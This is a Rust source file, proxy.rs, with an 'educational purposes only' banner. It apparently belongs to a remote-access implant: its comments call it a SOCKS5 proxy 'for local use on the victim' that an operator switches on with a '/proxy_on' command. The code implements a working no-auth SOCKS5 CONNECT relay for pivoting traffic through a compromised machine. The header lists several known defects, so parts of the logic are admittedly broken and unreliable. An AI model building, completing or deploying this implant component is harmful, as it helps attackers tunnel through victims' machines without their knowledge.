/*
** *********************************************************************
** *********************************************************************
**
**                              DISCLAIMER
**       For educational purposes only. 2026 All rights reversed.
**
** *********************************************************************
** *********************************************************************
*/

// proxy.rs — SOCKS5 CONNECT proxy for local use on the victim.
//
// BROKEN vs comments/README:
//   - Comments say "avoid binding until enabled"; code binds immediately,
//     then spins 200ms while PROXY_ENABLED is false.
//   - PROXY_ENABLED starts false; /proxy_on only flips the flag.
//   - Default addr is 127.0.0.1 — operator cannot reach it remotely.
//   - start_socks5_server already spawns a thread; main.rs spawns another.
//   - No IPv6, no auth, CONNECT only.

use log::{info, error};
use once_cell::sync::Lazy;
use std::sync::atomic::{AtomicBool, Ordering};
use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncReadExt, AsyncWriteExt};

static PROXY_ENABLED: Lazy<AtomicBool> = Lazy::new(|| AtomicBool::new(false));

pub fn is_enabled()           -> bool { PROXY_ENABLED.load(Ordering::Relaxed) }
/// Flip accept-loop gate. Does not bind or unbind the socket.
pub fn enable_proxy(on: bool)         { PROXY_ENABLED.store(on, Ordering::Relaxed); info!("Proxy: {}", on); }

/// Bind `addr` on a dedicated OS thread + current-thread Tokio runtime.
/// Accept loop ignores connections until enable_proxy(true).
pub fn start_socks5_server(addr: &str) {
    let addr = addr.to_string();
    std::thread::spawn(move || {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .expect("proxy rt");
        rt.block_on(async move {
            let listener = match TcpListener::bind(&addr).await {
                Ok(l)  => { info!("SOCKS5 listening on {}", addr); l }
                Err(e) => { error!("SOCKS5 bind failed: {}", e); return; }
            };
            loop {
                // Check enabled state before accepting.
                // BROKEN: still bound; just delays accept. Port is occupied.
                if !PROXY_ENABLED.load(Ordering::Relaxed) {
                    tokio::time::sleep(tokio::time::Duration::from_millis(200)).await;
                    continue;
                }
                match listener.accept().await {
                    Ok((stream, _)) => { tokio::spawn(handle_socks5(stream)); }
                    Err(e)          => { error!("SOCKS5 accept: {}", e); break; }
                }
            }
        });
    });
}

/// Minimal SOCKS5: no-auth greeting, CONNECT to IPv4 or domain, then copy both ways.
async fn handle_socks5(mut stream: TcpStream) {
    let mut buf = [0u8; 256];

    // Greeting.
    if stream.read(&mut buf).await.unwrap_or(0) < 3 || buf[0] != 0x05 { return; }
    if stream.write_all(&[0x05, 0x00]).await.is_err() { return; }

    // Request.
    let n = stream.read(&mut buf).await.unwrap_or(0);
    if n < 7 || buf[0] != 0x05 || buf[1] != 0x01 { return; } // only CONNECT

    let atyp = buf[3];
    let (target_host, port) = match atyp {
        0x01 => {
            // IPv4
            let ip   = format!("{}.{}.{}.{}", buf[4], buf[5], buf[6], buf[7]);
            let port = u16::from_be_bytes([buf[8], buf[9]]);
            (ip, port)
        }
        0x03 => {
            // Domain name
            let len  = buf[4] as usize;
            let name = String::from_utf8_lossy(&buf[5..5+len]).to_string();
            let port = u16::from_be_bytes([buf[5+len], buf[6+len]]);
            (name, port)
        }
        _ => return, // IPv6 (0x04) and others dropped
    };

    let target = format!("{}:{}", target_host, port);
    match TcpStream::connect(&target).await {
        Ok(mut ts) => {
            // Success reply.
            let _ = stream.write_all(&[0x05, 0x00, 0x00, 0x01,
                                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00]).await;
            let (mut cr, mut cw) = stream.split();
            let (mut tr, mut tw) = ts.split();
            tokio::join!(
                tokio::io::copy(&mut cr, &mut tw),
                tokio::io::copy(&mut tr, &mut cw),
            );
        }
        Err(_) => {
            let _ = stream.write_all(&[0x05, 0x05, 0x00, 0x01,
                                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00]).await;
        }
    }
}
